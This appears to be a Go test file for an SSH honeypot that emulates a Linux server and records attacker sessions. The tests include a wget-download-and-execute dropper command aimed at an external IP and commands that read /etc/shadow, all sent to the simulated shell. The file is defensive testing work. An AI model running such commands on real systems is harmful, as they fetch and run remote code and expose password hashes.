package honeypot

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"io"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/machine"
	"github.com/amirradjou/llm-honeypot/internal/profile"
	"github.com/amirradjou/llm-honeypot/internal/recorder"
	"github.com/amirradjou/llm-honeypot/internal/sshd"

	"golang.org/x/crypto/ssh"
)

func startHoneypot(t *testing.T) (addr, dataDir string) {
	t.Helper()
	dataDir = t.TempDir()
	m, err := machine.New(profile.Default(), time.Now)
	if err != nil {
		t.Fatal(err)
	}
	rec := recorder.New(dataDir)
	h := New(m, rec, slog.New(slog.NewTextHandler(io.Discard, nil)))

	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	signer, _ := ssh.NewSignerFromKey(priv)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := sshd.New(sshd.Config{AuthDelay: time.Millisecond}, signer, h, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ctx, cancel := context.WithCancel(context.Background())
	go func() { _ = srv.Serve(ctx, ln) }()
	t.Cleanup(cancel)
	return ln.Addr().String(), dataDir
}

func dialHoneypot(t *testing.T, addr, user, pass string) *ssh.Client {
	t.Helper()
	c, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

func exec(t *testing.T, c *ssh.Client, cmd string) string {
	t.Helper()
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer sess.Close()
	out, _ := sess.CombinedOutput(cmd)
	return string(out)
}

func TestEndToEndExecAndRecording(t *testing.T) {
	addr, dataDir := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "admin123")

	if out := exec(t, c, "uname -a"); !strings.HasPrefix(out, "Linux srv-web01") {
		t.Errorf("uname -a = %q", out)
	}
	if out := exec(t, c, "whoami"); out != "root\n" {
		t.Errorf("whoami = %q", out)
	}
	drop := exec(t, c, "cd /tmp; wget http://185.246.0.1/x.sh -O m.sh; chmod +x m.sh; ./m.sh; ls m.sh")
	if !strings.Contains(drop, "200 OK") || !strings.Contains(drop, "Exec format error") || !strings.Contains(drop, "m.sh") {
		t.Errorf("dropper = %q", drop)
	}
	_ = c.Close()

	// Wait until the recording is complete: Disconnected flushes the final
	// events asynchronously after the client goes away.
	deadline := time.Now().Add(5 * time.Second)
	var types []string
	var sawDownload, sawAuthAccepted bool
	for time.Now().Before(deadline) {
		files := jsonlFiles(t, dataDir)
		if len(files) == 0 {
			time.Sleep(20 * time.Millisecond)
			continue
		}
		types = types[:0]
		sawDownload, sawAuthAccepted = false, false
		for _, line := range readLines(t, files[0]) {
			var e recorder.Event
			if err := json.Unmarshal([]byte(line), &e); err != nil {
				continue
			}
			types = append(types, string(e.Type))
			if e.Type == recorder.EventDownload && strings.Contains(e.URL, "185.246.0.1") {
				sawDownload = true
			}
			if e.Type == recorder.EventAuth && e.Accepted != nil && *e.Accepted {
				sawAuthAccepted = true
			}
		}
		if contains(types, "disconnect") {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	if len(types) == 0 {
		t.Fatal("no recordings written")
	}
	if !sawAuthAccepted {
		t.Error("no accepted auth recorded")
	}
	if !sawDownload {
		t.Error("download not recorded")
	}
	if !contains(types, "connect") || !contains(types, "disconnect") || !contains(types, "command") {
		t.Errorf("event types = %v", types)
	}
}

func TestEndToEndPrivilegeSeparation(t *testing.T) {
	addr, _ := startHoneypot(t)
	// A non-root login cannot read shadow but can via sudo.
	c := dialHoneypot(t, addr, "martin", "hunter2")
	if out := exec(t, c, "cat /etc/shadow"); !strings.Contains(out, "Permission denied") {
		t.Errorf("martin cat shadow = %q", out)
	}
	if out := exec(t, c, "id"); !strings.Contains(out, "uid=1001(martin)") {
		t.Errorf("martin id = %q", out)
	}
	if out := exec(t, c, "sudo head -1 /etc/shadow"); !strings.Contains(out, "root:$6$") {
		t.Errorf("martin sudo = %q", out)
	}
}

func jsonlFiles(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(p, ".jsonl") {
			out = append(out, p)
		}
		return nil
	})
	return out
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return strings.Split(strings.TrimRight(string(data), "\n"), "\n")
}

func contains(ss []string, v string) bool {
	for _, s := range ss {
		if s == v {
			return true
		}
	}
	return false
}
